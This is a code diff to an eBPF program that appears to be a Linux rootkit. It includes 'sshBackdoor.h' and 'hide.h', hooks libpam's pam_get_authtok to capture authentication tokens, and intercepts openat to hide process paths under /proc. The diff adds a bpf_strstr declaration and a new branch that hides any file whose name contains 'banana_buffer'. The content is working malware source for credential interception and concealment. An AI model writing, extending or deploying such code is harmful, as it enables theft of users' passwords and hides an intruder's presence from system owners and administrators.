@@ -17,7 +17,12 @@
 #include "hide.h"
 #include "sshBackdoor.h"
 #include "utils.h"
-// SEC("uprobe/pam_get_authtok")
+
+#if defined(bpf_strstr)
+#else
+extern int bpf_strstr(const char *str, const char *substr) __ksym;
+#endif
+
 SEC("uprobe//usr/lib/libpam.so.0:pam_get_authtok")
 int BPF_KPROBE(AuthtokEnter, struct pam_handle *pamh, int item,
                const char **authtok, const char *promt) {
@@ -152,7 +157,6 @@ int BPF_PROG(modify_openat, const struct pt_regs *regs) {
 
     char pid_str[64];
     BPF_SNPRINTF(pid_str, sizeof(pid_str), "/proc/%d", *value);
-
     // Use bpf_strncmp or check if filename starts with pid_str
     int len = 0;
 #pragma unroll
@@ -176,6 +180,10 @@ int BPF_PROG(modify_openat, const struct pt_regs *regs) {
       bpf_printk("blocked pid path: %s\n", pid_str);
       bpf_printk("%s\n", comm);
       return -ENOENT;
+    } else {
+      if (bpf_strstr(filename, "banana_buffer") >= 0) {
+        return -ENOENT;
+      }
     }
   }
 
